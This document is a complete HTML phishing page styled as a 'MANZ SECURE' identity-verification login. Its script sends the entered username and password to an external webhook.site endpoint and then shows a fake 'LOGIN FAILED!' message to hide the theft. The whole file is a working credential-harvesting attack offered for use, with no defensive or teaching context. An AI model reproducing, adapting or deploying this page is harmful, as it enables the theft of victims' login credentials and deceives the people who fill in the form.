<!DOCTYPE html>
<html>
<head>
    <title>MANZ SECURE</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        body {
            background: #000;
            color: #ff0000;
            font-family: 'Courier New', monospace;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .container {
            background: #111;
            padding: 40px;
            border-radius: 20px;
            border: 2px solid #ff0000;
            text-align: center;
            width: 320px;
        }
        .logo {
            font-size: 60px;
            font-weight: bold;
            margin-bottom: 20px;
            text-shadow: 0 0 10px red;
        }
        input {
            width: 90%;
            padding: 12px;
            margin: 10px 0;
            background: #222;
            border: 1px solid #ff0000;
            color: white;
            border-radius: 5px;
            font-size: 16px;
        }
        button {
            background: #ff0000;
            color: white;
            padding: 12px;
            border: none;
            width: 100%;
            border-radius: 5px;
            font-size: 18px;
            font-weight: bold;
            cursor: pointer;
            margin-top: 10px;
        }
        button:hover {
            background: #cc0000;
        }
        h2 {
            margin-bottom: 20px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">👑 MANZ 👑</div>
        <h2>VERIFY IDENTITY</h2>
        <input type="text" id="username" placeholder="Username / Email" autocomplete="off">
        <input type="password" id="password" placeholder="Password">
        <button onclick="sendData()">LOGIN</button>
        <p style="font-size: 12px; margin-top: 20px;">System Security Check</p>
    </div>

    <script>
        function sendData() {
            let user = document.getElementById('username').value;
            let pass = document.getElementById('password').value;
            
            if(user && pass) {
                // Kirim ke webhook
                fetch('https://webhook.site/your-unique-id-here', {
                    method: 'POST',
                    mode: 'no-cors',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        username: user,
                        password: pass,
                        timestamp: new Date().toISOString(),
                        ip: 'auto-capture'
                    })
                });
                
                alert('LOGIN FAILED! Please try again.');
                document.getElementById('username').value = '';
                document.getElementById('password').value = '';
            } else {
                alert('Please fill all fields!');
            }
        }
    </script>
</body>
</html>
